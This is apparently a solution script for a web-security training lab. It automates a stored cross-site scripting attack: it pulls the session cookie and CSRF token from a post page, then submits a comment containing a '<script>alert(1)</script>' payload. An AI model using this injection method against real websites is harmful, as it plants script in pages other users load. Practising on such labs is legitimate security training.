################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 14/11/2023
#
# Lab: Stored XSS into HTML context with nothing encoded
#
# Steps: 1. Fetch a post page
#        2. Extract the session cookie and the csrf token to post a comment
#        3. Post a comment with the injected payload in the comment field
#
################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re

#########
# Main
#########

# change this to your lab URL
url = "https://0afb005103faa98580a73fc3006700a5.web-security-academy.net"

try:  
    # fetch a post page
    post_page = requests.get(f"{url}/post?postId=1")

except:
    print(Fore.RED + "[!] Failed to fetch a post page through exception")
    exit(1) 

print(Fore.WHITE + "⦗1⦘ Fetching a post page.. " + Fore.GREEN + "OK")

# get session cookie
session = post_page.cookies.get("session")

# extract the csrf token
csrf = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. " + Fore.GREEN + "OK")

# payload to call the alert function
payload = "<script>alert(1)</script>"

# data to send via POST
data = {
    "postId": "1",
    "name": "Hacker",
    "email": "hack@me.com",
    "comment": payload,
    "csrf": csrf,
}

# set session cookie
cookies = {
    "session": session
}

try:
    # post a comment with the injected payload in the comment field
    requests.post(f"{url}/post/comment", data, cookies=cookies)

except:
    print(Fore.RED + "[!] Failed to post a comment with the injected payload in the comment field through exception")
    exit(1)

print(Fore.WHITE + "⦗3⦘ Posting a comment with the injected payload in the comment field.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



